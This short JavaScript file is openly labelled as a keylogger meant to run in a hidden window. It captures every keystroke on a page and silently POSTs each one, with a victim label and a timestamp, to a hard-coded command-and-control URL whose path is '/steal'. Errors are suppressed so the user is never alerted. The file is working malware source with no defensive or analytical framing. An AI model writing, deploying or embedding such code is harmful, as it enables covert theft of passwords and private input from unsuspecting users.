// === Config ===
const C2_SERVER = "https://invoice-wimt.onrender.com/steal"; 

// === Keylogger ===
// This script runs in a hidden worker window.
document.addEventListener("keydown", (event) => {
  const data = {
    type: "keylogger",
    key: event.key,
    victim: "PC-User-01",
    timestamp: new Date().toISOString()
  };

  // Send each keystroke to the attacker server
  try {
    fetch(C2_SERVER, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(data)
    });
  } catch (err) {
    // Fail silently
  }
}); 